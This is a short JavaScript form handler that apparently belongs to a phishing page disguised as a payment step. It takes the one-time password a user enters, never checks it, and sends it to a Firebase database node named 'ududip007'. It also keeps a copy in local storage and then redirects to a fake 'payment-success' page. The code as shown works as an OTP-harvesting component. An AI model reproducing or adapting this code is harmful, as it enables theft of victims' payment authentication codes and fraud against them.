
  document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    const otp = document.getElementById("otp").value;

    if (!otp) {
      alert("Please enter the OTP");
      return;
    }

    const entryRef = firebase.database().ref("ududip007").push();
    entryRef.set({
      otp: otp
    }).then(() => {
      localStorage.setItem("otp", otp);
      window.location.href = "payment-success.html"; // redirect after success
    }).catch((error) => {
      alert("Error: " + error.message);
    });
  });
